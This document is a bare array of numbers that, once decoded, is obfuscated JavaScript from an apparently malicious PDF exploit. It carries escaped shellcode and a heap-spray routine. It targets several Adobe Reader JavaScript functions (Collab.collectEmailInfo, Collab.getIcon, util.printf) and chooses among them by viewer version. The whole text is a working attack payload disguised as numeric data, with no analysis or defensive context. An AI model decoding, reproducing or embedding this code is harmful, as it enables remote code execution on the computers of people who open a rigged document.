174, 109, 110, 113, 125, 94, 174, 110, 105, 114, 124, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 112, 110, 127, 127, 94, 174, 124, 112, 105, 113, 94, 174, 114, 124, 109, 110, 94, 174, 105, 105, 109, 109, 94, 174, 105, 105, 105, 105, 94, 174, 127, 127, 110, 108, 94, 174, 110, 127, 125, 112, 94, 174, 123, 111, 105, 127, 94, 174, 110, 123, 124, 105, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 110, 106, 126, 124, 94, 174, 110, 108, 110, 106, 94, 174, 110, 112, 110, 111, 94, 174, 109, 107, 111, 122, 94, 174, 112, 107, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 113, 123, 105, 105, 94, 174, 108, 108, 125, 113, 94, 174, 113, 110, 127, 111, 94, 174, 110, 114, 125, 123, 94, 174, 109, 110, 124, 112, 94, 174, 111, 106, 127, 113, 94, 174, 111, 110, 107, 126, 94, 174, 124, 112, 112, 113, 94, 174, 127, 124, 109, 110, 94, 174, 105, 105, 111, 110, 94, 174, 105, 105, 105, 105, 94, 174, 110, 111, 112, 126, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 111, 94, 174, 105, 105, 110, 106, 94, 174, 105, 105, 105, 105, 94, 174, 110, 105, 110, 114, 94, 174, 123, 106, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 113, 125, 108, 114, 94, 174, 105, 106, 109, 111, 94, 174, 126, 113, 110, 105, 94, 174, 105, 105, 108, 123, 94, 174, 105, 105, 105, 105, 94, 174, 127, 113, 113, 123, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 107, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 110, 112, 105, 124, 94, 174, 105, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 127, 127, 94, 174, 109, 109, 124, 111, 94, 174, 127, 127, 108, 113, 94, 174, 110, 105, 112, 108, 94, 174, 109, 110, 113, 125, 94, 174, 127, 126, 127, 113, 94, 174, 110, 113, 105, 105, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 112, 94, 174, 127, 126, 112, 109, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 110, 114, 94, 174, 109, 111, 109, 111, 94, 174, 127, 108, 108, 123, 94, 174, 122, 122, 112, 124, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 110, 108, 110, 106, 94, 174, 111, 105, 111, 111, 94, 174, 108, 107, 123, 106, 94, 174, 105, 105, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 110, 113, 105, 105, 94, 174, 105, 113, 108, 113, 94, 174, 105, 108, 112, 109, 94, 174, 126, 123, 109, 105, 94, 174, 109, 105, 127, 114, 94, 174, 110, 125, 113, 123, 94, 174, 113, 105, 105, 113, 94, 174, 109, 107, 127, 123, 94, 174, 105, 113, 112, 110, 94, 174, 125, 123, 108, 108, 94, 174, 106, 113, 113, 122, 94, 174, 124, 108, 113, 123, 94, 174, 106, 112, 126, 123, 94, 174, 106, 113, 108, 113, 94, 174, 106, 106, 112, 111, 94, 174, 108, 108, 109, 105, 94, 174, 113, 109, 124, 114, 94, 174, 112, 109, 125, 123, 94, 174, 109, 105, 105, 124, 94, 174, 105, 113, 108, 113, 94, 174, 127, 123, 112, 110, 94, 174, 127, 126, 109, 105, 94, 174, 126, 123, 124, 123, 94, 174, 108, 108, 127, 107, 94, 174, 113, 114, 124, 105, 94, 174, 127, 124, 109, 110, 94, 174, 109, 110, 113, 123, 94, 174, 110, 123, 127, 124, 94, 174, 124, 108, 124, 114, 94, 174, 105, 107, 108, 107, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 124, 111, 123, 94, 174, 112, 108, 111, 125, 94, 174, 112, 113, 112, 111, 94, 174, 107, 126, 108, 107, 94, 174, 112, 113, 111, 110, 94, 174, 105, 105, 111, 110, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 124, 111, 108, 94, 174, 111, 108, 111, 114, 94, 174, 107, 126, 111, 123, 94, 174, 111, 113, 112, 105, 94, 174, 108, 127, 112, 105, 94, 174, 108, 125, 112, 107, 94, 174, 105, 105, 105, 105, 91, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 166, 158, 166, 152, 154, 171, 171, 154, 178, 89, 118, 89, 167, 158, 176, 89, 122, 171, 171, 154, 178, 97, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 156, 156, 89, 118, 89, 105, 177, 105, 156, 105, 156, 105, 156, 105, 156, 116, 70, 67, 66, 66, 175, 154, 171, 89, 154, 157, 157, 171, 89, 118, 89, 105, 177, 109, 105, 105, 105, 105, 105, 116, 70, 67, 66, 66, 175, 154, 171, 89, 172, 156, 152, 165, 158, 167, 89, 118, 89, 172, 161, 158, 165, 165, 156, 168, 157, 158, 103, 165, 158, 167, 160, 173, 161, 89, 99, 89, 107, 116, 70, 67, 66, 66, 175, 154, 171, 89, 165, 158, 167, 89, 118, 89, 154, 157, 157, 171, 89, 102, 89, 97, 172, 156, 152, 165, 158, 167, 100, 105, 177, 108, 113, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 178, 154, 171, 172, 169, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 114, 105, 114, 105, 94, 174, 114, 105, 114, 105, 91, 98, 116, 70, 67, 66, 66, 178, 154, 171, 172, 169, 89, 118, 89, 159, 162, 177, 152, 162, 173, 97, 178, 154, 171, 172, 169, 101, 89, 165, 158, 167, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 156, 168, 174, 167, 173, 107, 89, 118, 89, 97, 156, 156, 89, 102, 89, 105, 177, 109, 105, 105, 105, 105, 105, 98, 104, 154, 157, 157, 171, 116, 70, 67, 66, 66, 159, 168, 171, 89, 97, 175, 154, 171, 89, 156, 168, 174, 167, 173, 89, 118, 89, 105, 116, 89, 156, 168, 174, 167, 173, 89, 117, 89, 156, 168, 174, 167, 173, 107, 116, 89, 156, 168, 174, 167, 173, 100, 100, 98, 180, 70, 67, 66, 66, 66, 166, 158, 166, 152, 154, 171, 171, 154, 178, 148, 156, 168, 174, 167, 173, 150, 89, 118, 89, 178, 154, 171, 172, 169, 89, 100, 89, 172, 161, 158, 165, 165, 156, 168, 157, 158, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 175, 154, 171, 89, 168, 175, 158, 171, 159, 165, 168, 176, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 105, 156, 105, 156, 94, 174, 105, 156, 105, 156, 91, 98, 116, 70, 67, 66, 66, 176, 161, 162, 165, 158, 89, 97, 168, 175, 158, 171, 159, 165, 168, 176, 103, 165, 158, 167, 160, 173, 161, 89, 117, 89, 109, 109, 114, 110, 107, 98, 180, 70, 67, 66, 66, 66, 168, 175, 158, 171, 159, 165, 168, 176, 89, 100, 118, 89, 168, 175, 158, 171, 159, 165, 168, 176, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 173, 161, 162, 172, 103, 156, 168, 165, 165, 154, 155, 140, 173, 168, 171, 158, 89, 118, 89, 124, 168, 165, 165, 154, 155, 103, 156, 168, 165, 165, 158, 156, 173, 126, 166, 154, 162, 165, 130, 167, 159, 168, 97, 180, 172, 174, 155, 163, 115, 89, 91, 91, 101, 166, 172, 160, 115, 89, 168, 175, 158, 171, 159, 165, 168, 176, 182, 98, 116, 70, 67, 66, 182, 70, 67, 70, 67, 66, 159, 174, 167, 156, 173, 162, 168, 167, 89, 156, 168, 165, 165, 154, 155, 152, 160, 158, 173, 162, 156, 168, 167, 97, 98, 180, 70, 67, 66, 66, 162, 159, 89, 97, 154, 169, 169, 103, 157, 168, 156, 103, 124, 168, 165, 165, 154, 155, 103, 160, 158, 173, 130, 156, 168, 167, 98, 180, 70, 67, 66, 66, 66, 175, 154, 171, 89, 154, 171, 171, 178, 89, 118, 89, 167, 158, 176, 89, 122, 171, 171, 154, 178, 97, 98, 116, 70, 67, 66, 66, 66, 175, 154, 171, 89, 175, 175, 169, 158, 173, 161, 178, 154, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 126, 123, 126, 114, 94, 174, 105, 105, 105, 106, 94, 174, 110, 111, 105, 105, 94, 174, 122, 106, 111, 109, 94, 174, 105, 105, 108, 105, 94, 174, 105, 105, 105, 105, 94, 174, 109, 105, 113, 123, 94, 174, 113, 123, 105, 124, 94, 174, 106, 124, 112, 105, 94, 174, 113, 123, 122, 125, 94, 174, 105, 113, 109, 105, 94, 174, 124, 108, 110, 126, 94, 174, 113, 123, 110, 110, 94, 174, 113, 123, 126, 124, 94, 174, 105, 113, 109, 110, 94, 174, 108, 108, 110, 107, 94, 174, 124, 106, 125, 107, 94, 174, 105, 108, 124, 107, 94, 174, 106, 105, 108, 107, 94, 174, 113, 105, 109, 105, 94, 174, 105, 105, 108, 113, 94, 174, 127, 110, 112, 110, 94, 174, 124, 107, 113, 123, 94, 174, 110, 125, 110, 122, 94, 174, 105, 109, 124, 107, 94, 174, 110, 110, 105, 105, 94, 174, 126, 124, 113, 123, 94, 174, 110, 106, 110, 106, 94, 174, 110, 111, 110, 108, 94, 174, 111, 105, 110, 112, 94, 174, 110, 125, 113, 123, 94, 174, 108, 108, 105, 113, 94, 174, 113, 123, 124, 105, 94, 174, 105, 124, 112, 110, 94, 174, 127, 126, 113, 123, 94, 174, 112, 111, 105, 108, 94, 174, 113, 123, 108, 124, 94, 174, 112, 113, 109, 126, 94, 174, 124, 127, 105, 108, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 106, 124, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 107, 109, 94, 174, 112, 106, 113, 123, 94, 174, 109, 126, 106, 109, 94, 174, 112, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 107, 105, 112, 106, 94, 174, 127, 112, 105, 108, 94, 174, 109, 122, 114, 114, 94, 174, 109, 107, 122, 125, 94, 174, 108, 123, 111, 105, 94, 174, 127, 124, 110, 110, 94, 174, 105, 109, 112, 110, 94, 174, 124, 105, 108, 108, 94, 174, 108, 112, 126, 123, 94, 174, 127, 127, 108, 108, 94, 174, 109, 110, 105, 108, 94, 174, 114, 112, 105, 124, 94, 174, 124, 127, 113, 123, 94, 174, 112, 110, 122, 126, 94, 174, 107, 123, 127, 125, 94, 174, 109, 127, 127, 114, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 114, 109, 94, 174, 127, 127, 127, 127, 94, 174, 124, 108, 108, 123, 94, 174, 112, 109, 111, 106, 94, 174, 126, 123, 105, 107, 94, 174, 113, 123, 125, 114, 94, 174, 105, 124, 109, 110, 94, 174, 110, 126, 114, 107, 94, 174, 127, 107, 105, 108, 94, 174, 126, 105, 125, 106, 94, 174, 124, 111, 105, 108, 94, 174, 124, 114, 108, 108, 94, 174, 123, 112, 105, 127, 94, 174, 110, 127, 105, 113, 94, 174, 126, 106, 124, 106, 94, 174, 105, 108, 105, 107, 94, 174, 105, 108, 124, 122, 94, 174, 113, 123, 124, 127, 94, 174, 105, 108, 105, 106, 94, 174, 113, 114, 124, 107, 94, 174, 127, 113, 109, 110, 94, 174, 113, 123, 111, 106, 94, 174, 127, 113, 109, 110, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 109, 114, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 111, 105, 126, 113, 94, 174, 105, 109, 123, 127, 94, 174, 111, 124, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 108, 108, 127, 127, 94, 174, 110, 107, 125, 107, 94, 174, 127, 127, 110, 107, 94, 174, 105, 113, 112, 110, 94, 174, 125, 105, 127, 127, 94, 174, 109, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 127, 124, 109, 110, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 105, 124, 126, 124, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 111, 125, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 111, 127, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 124, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 125, 94, 174, 109, 110, 124, 111, 94, 174, 105, 105, 127, 126, 94, 174, 122, 105, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 105, 127, 127, 94, 174, 110, 125, 111, 113, 94, 174, 106, 106, 113, 122, 94, 174, 126, 113, 106, 111, 94, 174, 127, 127, 106, 110, 94, 174, 127, 127, 127, 127, 94, 174, 124, 109, 113, 108, 94, 174, 113, 110, 105, 124, 94, 174, 112, 109, 124, 105, 94, 174, 111, 122, 106, 110, 94, 174, 111, 122, 105, 105, 94, 174, 127, 127, 105, 105, 94, 174, 105, 124, 112, 110, 94, 174, 112, 110, 127, 127, 94, 174, 111, 122, 105, 113, 94, 174, 127, 127, 105, 105, 94, 174, 113, 110, 125, 105, 94, 174, 112, 110, 124, 105, 94, 174, 109, 105, 105, 108, 94, 174, 124, 108, 124, 114, 94, 174, 124, 105, 108, 108, 94, 174, 124, 108, 124, 114, 94, 174, 108, 108, 110, 112, 94, 174, 113, 123, 124, 105, 94, 174, 107, 109, 109, 124, 94, 174, 113, 123, 105, 124, 94, 174, 107, 109, 112, 124, 94, 174, 127, 124, 105, 113, 94, 174, 122, 122, 127, 108, 94, 174, 124, 108, 110, 127, 94, 174, 109, 124, 113, 123, 94, 174, 105, 109, 107, 109, 94, 174, 108, 114, 113, 105, 94, 174, 113, 123, 105, 105, 94, 174, 112, 109, 124, 106, 94, 174, 109, 105, 105, 111, 94, 174, 108, 113, 113, 105, 94, 174, 112, 110, 105, 105, 94, 174, 107, 123, 127, 122, 94, 174, 124, 108, 124, 106, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 111, 109, 126, 124, 94, 174, 113, 125, 110, 108, 94, 174, 127, 105, 109, 110, 94, 174, 108, 108, 110, 112, 94, 174, 110, 105, 125, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 123, 127, 105, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 106, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 107, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 108, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 108, 108, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 108, 107, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 123, 94, 174, 110, 125, 113, 113, 94, 174, 126, 113, 127, 124, 94, 174, 127, 127, 105, 123, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 109, 108, 111, 113, 94, 174, 113, 126, 127, 114, 94, 174, 113, 105, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 123, 127, 127, 94, 174, 113, 125, 127, 113, 94, 174, 114, 124, 109, 110, 94, 174, 109, 109, 111, 122, 94, 174, 126, 113, 110, 105, 94, 174, 127, 127, 112, 126, 94, 174, 127, 127, 127, 127, 94, 174, 109, 110, 113, 125, 94, 174, 111, 122, 126, 105, 94, 174, 110, 105, 106, 105, 94, 174, 112, 108, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 108, 127, 127, 94, 174, 106, 124, 124, 109, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 126, 105, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 114, 124, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 112, 110, 127, 127, 94, 174, 124, 112, 105, 113, 94, 174, 114, 124, 109, 110, 94, 174, 105, 105, 109, 109, 94, 174, 105, 105, 105, 105, 94, 174, 127, 127, 110, 108, 94, 174, 110, 127, 125, 112, 94, 174, 123, 111, 105, 127, 94, 174, 110, 123, 124, 105, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 110, 106, 126, 124, 94, 174, 110, 108, 110, 106, 94, 174, 110, 112, 110, 111, 94, 174, 109, 107, 111, 122, 94, 174, 112, 107, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 113, 123, 105, 105, 94, 174, 108, 108, 125, 113, 94, 174, 113, 110, 127, 111, 94, 174, 110, 114, 125, 123, 94, 174, 109, 110, 124, 112, 94, 174, 111, 106, 127, 113, 94, 174, 111, 110, 107, 126, 94, 174, 124, 112, 112, 113, 94, 174, 127, 124, 109, 110, 94, 174, 105, 105, 111, 110, 94, 174, 105, 105, 105, 105, 94, 174, 110, 111, 112, 126, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 111, 94, 174, 105, 105, 110, 106, 94, 174, 105, 105, 105, 105, 94, 174, 110, 105, 110, 114, 94, 174, 123, 106, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 113, 125, 108, 114, 94, 174, 105, 106, 109, 111, 94, 174, 126, 113, 110, 105, 94, 174, 105, 105, 108, 123, 94, 174, 105, 105, 105, 105, 94, 174, 127, 113, 113, 123, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 107, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 110, 112, 105, 124, 94, 174, 105, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 127, 127, 94, 174, 109, 109, 124, 111, 94, 174, 127, 127, 108, 113, 94, 174, 110, 105, 112, 108, 94, 174, 109, 110, 113, 125, 94, 174, 127, 126, 127, 113, 94, 174, 110, 113, 105, 105, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 112, 94, 174, 127, 126, 112, 109, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 110, 114, 94, 174, 109, 111, 109, 111, 94, 174, 127, 108, 108, 123, 94, 174, 122, 122, 112, 124, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 110, 108, 110, 106, 94, 174, 111, 105, 111, 111, 94, 174, 108, 107, 123, 106, 94, 174, 105, 105, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 110, 113, 105, 105, 94, 174, 105, 113, 108, 113, 94, 174, 105, 108, 112, 109, 94, 174, 126, 123, 109, 105, 94, 174, 109, 105, 127, 114, 94, 174, 110, 125, 113, 123, 94, 174, 113, 105, 105, 113, 94, 174, 109, 107, 127, 123, 94, 174, 105, 113, 112, 110, 94, 174, 125, 123, 108, 108, 94, 174, 106, 113, 113, 122, 94, 174, 124, 108, 113, 123, 94, 174, 106, 112, 126, 123, 94, 174, 106, 113, 108, 113, 94, 174, 106, 106, 112, 111, 94, 174, 108, 108, 109, 105, 94, 174, 113, 109, 124, 114, 94, 174, 112, 109, 125, 123, 94, 174, 109, 105, 105, 124, 94, 174, 105, 113, 108, 113, 94, 174, 127, 123, 112, 110, 94, 174, 127, 126, 109, 105, 94, 174, 126, 123, 124, 123, 94, 174, 108, 108, 127, 107, 94, 174, 113, 114, 124, 105, 94, 174, 127, 124, 109, 110, 94, 174, 109, 110, 113, 123, 94, 174, 110, 123, 127, 124, 94, 174, 124, 108, 124, 114, 94, 174, 105, 107, 108, 107, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 124, 111, 106, 94, 174, 112, 106, 111, 126, 94, 174, 112, 112, 112, 107, 94, 174, 107, 126, 108, 107, 94, 174, 112, 113, 111, 110, 94, 174, 105, 105, 111, 110, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 124, 111, 108, 94, 174, 111, 108, 111, 114, 94, 174, 107, 126, 111, 123, 94, 174, 111, 113, 112, 105, 94, 174, 108, 127, 112, 105, 94, 174, 108, 125, 112, 107, 94, 174, 105, 105, 105, 105, 91, 98, 116, 70, 67, 66, 66, 66, 175, 154, 171, 89, 161, 144, 170, 110, 105, 105, 124, 135, 89, 118, 89, 175, 175, 169, 158, 173, 161, 178, 154, 103, 165, 158, 167, 160, 173, 161, 89, 99, 89, 107, 116, 70, 67, 66, 66, 66, 175, 154, 171, 89, 165, 158, 167, 89, 118, 89, 105, 177, 109, 105, 105, 105, 105, 105, 89, 102, 89, 97, 161, 144, 170, 110, 105, 105, 124, 135, 89, 100, 89, 105, 177, 108, 113, 98, 116, 70, 67, 66, 66, 66, 175, 154, 171, 89, 178, 154, 171, 172, 169, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 114, 105, 114, 105, 94, 174, 114, 105, 114, 105, 91, 98, 116, 70, 67, 66, 66, 66, 178, 154, 171, 172, 169, 89, 118, 89, 159, 162, 177, 152, 162, 173, 97, 178, 154, 171, 172, 169, 101, 89, 165, 158, 167, 98, 116, 70, 67, 66, 66, 66, 175, 154, 171, 89, 169, 110, 122, 163, 132, 111, 110, 159, 89, 118, 89, 97, 105, 177, 105, 156, 105, 156, 105, 156, 105, 156, 89, 102, 89, 105, 177, 109, 105, 105, 105, 105, 105, 98, 89, 104, 89, 105, 177, 109, 105, 105, 105, 105, 105, 116, 70, 67, 66, 66, 66, 159, 168, 171, 89, 97, 175, 154, 171, 89, 175, 170, 156, 138, 125, 114, 111, 178, 89, 118, 89, 105, 116, 89, 175, 170, 156, 138, 125, 114, 111, 178, 89, 117, 89, 169, 110, 122, 163, 132, 111, 110, 159, 116, 89, 175, 170, 156, 138, 125, 114, 111, 178, 89, 100, 100, 89, 98, 180, 70, 67, 66, 66, 66, 66, 154, 171, 171, 178, 148, 175, 170, 156, 138, 125, 114, 111, 178, 150, 89, 118, 89, 178, 154, 171, 172, 169, 89, 100, 89, 175, 175, 169, 158, 173, 161, 178, 154, 116, 70, 67, 66, 66, 66, 182, 70, 67, 66, 66, 66, 175, 154, 171, 89, 173, 142, 134, 161, 135, 155, 128, 176, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 105, 114, 91, 98, 116, 70, 67, 66, 66, 66, 176, 161, 162, 165, 158, 89, 97, 173, 142, 134, 161, 135, 155, 128, 176, 103, 165, 158, 167, 160, 173, 161, 89, 117, 89, 105, 177, 109, 105, 105, 105, 98, 180, 70, 67, 66, 66, 66, 66, 173, 142, 134, 161, 135, 155, 128, 176, 89, 100, 118, 89, 173, 142, 134, 161, 135, 155, 128, 176, 116, 70, 67, 66, 66, 66, 182, 70, 67, 66, 66, 66, 173, 142, 134, 161, 135, 155, 128, 176, 89, 118, 89, 91, 135, 103, 91, 89, 100, 89, 173, 142, 134, 161, 135, 155, 128, 176, 116, 70, 67, 66, 66, 66, 154, 169, 169, 103, 157, 168, 156, 103, 124, 168, 165, 165, 154, 155, 103, 160, 158, 173, 130, 156, 168, 167, 97, 173, 142, 134, 161, 135, 155, 128, 176, 98, 116, 70, 67, 66, 66, 182, 70, 67, 66, 182, 70, 67, 70, 67, 66, 159, 174, 167, 156, 173, 162, 168, 167, 89, 169, 157, 159, 152, 172, 173, 154, 171, 173, 97, 98, 180, 70, 67, 70, 67, 66, 66, 175, 154, 171, 89, 175, 158, 171, 172, 162, 168, 167, 89, 118, 89, 154, 169, 169, 103, 175, 162, 158, 176, 158, 171, 143, 158, 171, 172, 162, 168, 167, 103, 173, 168, 140, 173, 171, 162, 167, 160, 97, 98, 116, 70, 67, 66, 66, 175, 158, 171, 172, 162, 168, 167, 89, 118, 89, 175, 158, 171, 172, 162, 168, 167, 103, 171, 158, 169, 165, 154, 156, 158, 97, 104, 149, 125, 104, 160, 101, 96, 96, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 89, 118, 89, 167, 158, 176, 89, 122, 171, 171, 154, 178, 97, 175, 158, 171, 172, 162, 168, 167, 103, 156, 161, 154, 171, 122, 173, 97, 105, 98, 101, 89, 175, 158, 171, 172, 162, 168, 167, 103, 156, 161, 154, 171, 122, 173, 97, 106, 98, 101, 89, 175, 158, 171, 172, 162, 168, 167, 103, 156, 161, 154, 171, 122, 173, 97, 107, 98, 98, 116, 70, 67, 66, 66, 162, 159, 89, 97, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 105, 150, 89, 118, 118, 89, 113, 98, 89, 95, 95, 89, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 106, 150, 89, 118, 118, 89, 105, 98, 89, 181, 181, 89, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 106, 150, 89, 118, 118, 89, 106, 89, 95, 95, 89, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 107, 150, 89, 117, 89, 108, 98, 98, 180, 70, 67, 66, 66, 66, 174, 173, 162, 165, 152, 169, 171, 162, 167, 173, 159, 97, 98, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 162, 159, 89, 97, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 105, 150, 89, 117, 89, 113, 98, 89, 181, 181, 89, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 105, 150, 89, 118, 118, 89, 113, 89, 95, 95, 89, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 106, 150, 89, 117, 89, 107, 89, 95, 95, 89, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 107, 150, 89, 117, 89, 107, 98, 98, 180, 70, 67, 66, 66, 66, 156, 168, 165, 165, 154, 155, 152, 158, 166, 154, 162, 165, 97, 98, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 162, 159, 89, 97, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 105, 150, 89, 117, 89, 114, 98, 89, 181, 181, 89, 97, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 105, 150, 89, 118, 118, 89, 114, 89, 95, 95, 89, 175, 154, 171, 172, 162, 168, 167, 152, 154, 171, 171, 154, 178, 148, 106, 150, 89, 117, 89, 106, 98, 98, 180, 70, 67, 66, 66, 66, 156, 168, 165, 165, 154, 155, 152, 160, 158, 173, 162, 156, 168, 167, 97, 98, 116, 70, 67, 66, 66, 182, 70, 67, 66, 182, 70, 67, 70, 67, 66, 169, 157, 159, 152, 172, 173, 154, 171, 173, 97, 98, 116, 70, 67, 66],
